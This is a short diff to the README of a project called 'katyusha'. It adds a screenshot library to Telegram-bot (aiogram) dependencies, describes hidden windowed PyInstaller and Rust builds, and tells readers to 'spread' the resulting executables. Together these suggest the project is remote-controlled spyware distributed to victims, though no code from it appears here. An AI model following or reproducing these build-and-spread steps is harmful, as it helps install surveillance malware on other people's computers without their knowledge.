@@ -2,6 +2,8 @@
 
 ### Development Setup
 
+```pip install pyscreenshot```
+
 ```pip install -U aiogram ujson aiohttp[speedups]```
 
 ```pip install uvloop``` ___ **NOT SUPPORTED BY WINDOWS**
@@ -14,10 +16,14 @@
 
 ```pm2 start katyusha.py```
 
-### Build
+### Build on Python
 
 ```pyinstaller --onefile --windowed --icon=katyusha.ico katyusha.py```
 
+### Build on Rust
+```cargo build --release```
+
 ### Usage
 
-Spread ```katyusha.exe``` inside dist folder.
+Spread ```katyusha.exe``` inside dist folder on python and katrust.exe inside target/release folder on rust
+
